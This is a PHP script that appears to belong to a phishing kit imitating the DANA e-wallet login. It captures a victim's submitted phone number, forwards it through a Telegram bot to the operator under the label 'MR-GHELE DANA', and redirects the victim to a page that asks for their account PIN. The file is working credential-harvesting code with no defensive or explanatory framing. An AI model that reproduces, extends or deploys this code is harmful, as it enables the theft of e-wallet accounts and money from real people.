<?php
session_start();
include "./../telegram.php";

$phone_number            = $_POST['phoneNumber'];
$_SESSION['phoneNumber'] = $phone_number;

$message = "
──────────────────────
MR-GHELE DANA | AKUN | ".$phone_number."
──────────────────────
• No HP : ".$phone_number."
──────────────────────";

include "./function.php";

sendMessage($telegram_id, $message, $id_bot);
header('Location: ./../../dana_pin/');
?>
